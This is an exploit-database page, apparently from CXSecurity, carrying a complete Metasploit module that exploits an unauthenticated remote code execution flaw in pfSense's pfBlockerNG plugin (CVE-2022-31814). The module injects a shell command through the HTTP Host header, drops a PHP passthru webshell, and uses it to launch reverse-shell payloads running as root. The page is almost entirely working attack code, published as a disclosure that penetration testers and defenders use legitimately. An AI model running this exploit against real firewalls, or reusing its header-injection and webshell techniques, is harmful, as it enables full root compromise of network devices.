---
title: pfSense pfBlockerNG 2.1.4_26 Shell Upload
url: https://cxsecurity.com/issue/WLB-2022100046
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-18
fetch_date: 2025-10-03T20:03:41.819765
---

# pfSense pfBlockerNG 2.1.4_26 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **pfSense pfBlockerNG 2.1.4\_26 Shell Upload** **2022.10.17**  Credit:  **[IHTeam](https://cxsecurity.com/author/IHTeam/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
include Msf::Exploit::FileDropper
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'pfSense plugin pfBlockerNG unauthenticated RCE as root',
'Description' => %q{
pfBlockerNG is a popular pfSense plugin that is not installed by default. It’s generally used to
block inbound connections from whole countries or IP ranges. Versions 2.1.4\_26 and below are affected
by an unauthenticated RCE vulnerability that results in root access. Note that version 3.x is unaffected.
},
'Author' => [
'IHTeam', # discovery
'jheysel-r7' # module
],
'References' => [
[ 'CVE', '2022-31814' ],
[ 'URL', 'https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/']
],
'License' => MSF\_LICENSE,
'Platform' => 'unix',
'Privileged' => false,
'Arch' => [ ARCH\_CMD ],
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_openssl'
}
}
],
[
'BSD Dropper',
{
'Platform' => 'bsd',
'Arch' => [ARCH\_X64],
'Type' => :bsd\_dropper,
'CmdStagerFlavor' => [ 'curl' ],
'DefaultOptions' => {
'PAYLOAD' => 'bsd/x64/shell\_reverse\_tcp'
}
}
]
],
'DefaultTarget' => 1,
'DisclosureDate' => '2022-09-05',
'DefaultOptions' => {
'SSL' => true,
'RPORT' => 443
},
'Notes' => {
'Stability' => [ CRASH\_SERVICE\_DOWN ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ],
'Reliability' => [ REPEATABLE\_SESSION, ]
}
)
)
register\_options(
[
OptString.new('WEBSHELL\_NAME', [
false, 'The name of the uploaded webshell sans the ".php" ending. This value will be randomly generated if left unset.', nil
])
]
)
end
def upload\_shell
print\_status 'Uploading shell...'
if datastore['WEBSHELL\_NAME'].blank?
@webshell\_name = "#{Rex::Text.rand\_text\_alpha(8..16)}.php"
else
@webshell\_name = "#{datastore['WEBSHELL\_NAME']}.php"
end
@parameter\_name = Rex::Text.rand\_text\_alpha(4..12)
print\_status("Webshell name is: #{@webshell\_name}")
web\_shell\_contents = <<~EOF
<?php echo file\_put\_contents('/usr/local/www/#{@webshell\_name}','<?php echo(passthru($\_POST["#{@parameter\_name}"]));');
EOF
encoded\_php = web\_shell\_contents.unpack('H\*')[0].upcase
send\_request\_raw(
'uri' => normalize\_uri(target\_uri.path, '/pfblockerng/www/index.php'),
'headers' => {
'Host' => "' \*; echo '16i #{encoded\_php} P' | dc | php; '"
}
)
sleep datastore['WfsDelay']
register\_file\_for\_cleanup("/usr/local/www/#{@webshell\_name}")
end
def check
upload\_shell
check\_resp = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, "/#{@webshell\_name}"),
'vars\_post' => {
@parameter\_name.to\_s => 'id'
}
)
return Exploit::CheckCode::Safe('Error uploading shell, the system is likely patched.') if check\_resp.nil? || check\_resp.body.nil? || !check\_resp.body.include?('uid=0(root) gid=0(wheel)')
Exploit::CheckCode::Vulnerable
end
def execute\_command(cmd, \_opts = {})
send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, @webshell\_name),
'headers' => {
'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8'
},
'vars\_post' => {
@parameter\_name.to\_s => cmd
}
})
end
def exploit
upload\_shell unless datastore['AutoCheck']
print\_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
case target['Type']
when :unix\_cmd
execute\_command(payload.encoded)
when :bsd\_dropper
execute\_cmdstager
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100046)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 -1

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top